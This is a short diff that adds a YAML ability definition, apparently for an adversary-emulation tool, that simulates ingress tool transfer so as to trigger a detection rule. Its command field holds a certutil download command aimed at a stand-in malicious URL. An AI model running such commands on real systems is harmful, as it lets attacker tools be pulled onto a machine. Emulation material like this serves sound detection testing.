@@ -1,0 +1,14 @@
+- name: CertUtil Download With VerifyCtl and Split Arguments
+  id: ACDT0041
+  platforms:
+    windows:
+      executor:
+        name: cmd
+        command: certutil.exe -f -split -VerifyCtl http://malicious-url.com
+      privilege: User
+  description: This ability simulates downloading files with certutil using VerifyCtl
+    and split arguments to trigger DT0283.
+  tactic: Command and Control
+  technique:
+    id: T1105
+    name: Ingress Tool Transfer
